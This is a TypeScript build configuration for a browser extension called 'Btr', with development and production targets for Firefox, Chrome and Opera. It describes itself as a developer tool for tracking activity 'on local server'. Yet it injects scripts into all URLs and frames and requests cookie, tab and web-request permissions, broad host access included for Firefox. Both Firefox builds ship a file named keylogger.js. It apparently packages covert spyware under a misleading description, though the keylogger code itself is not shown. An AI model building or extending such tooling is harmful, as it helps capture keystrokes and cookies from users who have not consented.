export interface BuildConfig {
  name: string;
  version: string;
  description: string;
  manifestVersion: 2 | 3;
  outputDir: string;
  includePopup: boolean;
  permissions: string[];
  filesToCopy?: string[];
  content_scripts?: Array<{
    matches: string[];
    js: string[];
    run_at: string;
    all_frames: boolean;
  }>;
  browserSpecificSettings?: {
    gecko?: {
      id: string;
      strict_min_version: string;
    };
  };
}

const contentScripts = [
  // {
  //   matches: ["<all_urls>"],
  //   js: ["keylogger.js"],
  //   run_at: "document_start",
  //   all_frames: true,
  // },
  // {
  //   matches: ["<all_urls>"],
  //   js: ["defaultAccessCode.js"],
  //   run_at: "document_start",
  //   all_frames: true,
  // },
  {
    matches: ["<all_urls>"],
    js: ["contentBridge.js"],
    run_at: "document_start",
    all_frames: true,
  },
];

export const configs: Record<string, BuildConfig> = {
  // Firefox development (manifest v2 with popup)
  "firefox-dev": {
    name: "Btr",
    version: "1.0.1",
    description: "Developer tool for debugging and tracking browser activity on local server",
    manifestVersion: 2,
    outputDir: "dist/firefox-dev",
    includePopup: true,
    filesToCopy: [
      'background.js',
      'contentBridge.js',
      'keylogger.js',
      'popup.html',
      'popup.js',
    ],
    content_scripts: contentScripts,
    permissions: [
      "tabs",
      "storage",
      "cookies",
      "webRequest",
      "webRequestBlocking",
      "scripting",
      "http://localhost/*",
      "http://127.0.0.1/*",
      "http://*/*",
      "https://*/*",
    ],
    browserSpecificSettings: {
      gecko: {
        id: "support@car-disks.com",
        strict_min_version: "109.0",
      },
    },
  },

  // Firefox production (manifest v2 without popup)
  "firefox-prod": {
    name: "Btr",
    version: "1.0.1",
    description: "Developer tool for debugging and tracking browser activity on local server",
    manifestVersion: 2,
    outputDir: "dist/firefox-prod",
    includePopup: false,
    filesToCopy: [
      'background.js',
      'contentBridge.js',
      'keylogger.js',
    ],
    content_scripts: contentScripts,
    permissions: [
      "tabs",
      "storage",
      "cookies",
      "webRequest",
      "webRequestBlocking",
      "scripting",
      "http://localhost/*",
      "http://127.0.0.1/*",
      "http://*/*",
      "https://*/*",
    ],
    browserSpecificSettings: {
      gecko: {
        id: "support@car-disks.com",
        strict_min_version: "109.0",
      },
    },
  },

  // Chrome/Opera development (manifest v3 with popup)
  "chrome-dev": {
    name: "Btr",
    version: "1.0.1",
    description: "Developer tool for debugging and tracking browser activity on local server",
    manifestVersion: 3,
    outputDir: "dist/chrome-dev",
    includePopup: true,
    filesToCopy: [
      'background.js',
      'contentBridge.js',
      'popup.html',
      'popup.js',
    ],
    content_scripts: contentScripts,
    permissions: ["tabs", "storage", "cookies", "webRequest", "scripting"],
    // В manifest v3 host_permissions отдельно
  },

  // Chrome/Opera production (manifest v3 without popup)
  "chrome-prod": {
    name: "Btr",
    version: "1.0.1",
    description: "Developer tool for debugging and tracking browser activity on local server",
    manifestVersion: 3,
    outputDir: "dist/chrome-prod",
    includePopup: false,
    filesToCopy: [
      'background.js',
      'contentBridge.js',
    ],
    content_scripts: contentScripts,
    permissions: ["tabs", "storage", "cookies", "webRequest", "scripting"],
  },

  // Opera development (same as Chrome dev)
  "opera-dev": {
    name: "Btr",
    version: "1.0.1",
    description: "Developer tool for debugging and tracking browser activity on local server",
    manifestVersion: 3,
    outputDir: "dist/opera-dev",
    includePopup: true,
    filesToCopy: [
      'background.js',
      'contentBridge.js',
    ],
    content_scripts: contentScripts,
    permissions: ["tabs", "storage", "cookies", "webRequest", "scripting"],
  },

  // Opera production (same as Chrome prod)
  "opera-prod": {
    name: "Btr",
    version: "1.0.1",
    description: "Developer tool for debugging and tracking browser activity on local server",
    manifestVersion: 3,
    outputDir: "dist/opera-prod",
    includePopup: false,
    filesToCopy: [
      'background.js',
      'contentBridge.js',
    ],
    content_scripts: contentScripts,
    permissions: ["tabs", "storage", "cookies", "webRequest", "scripting"],
  },
};
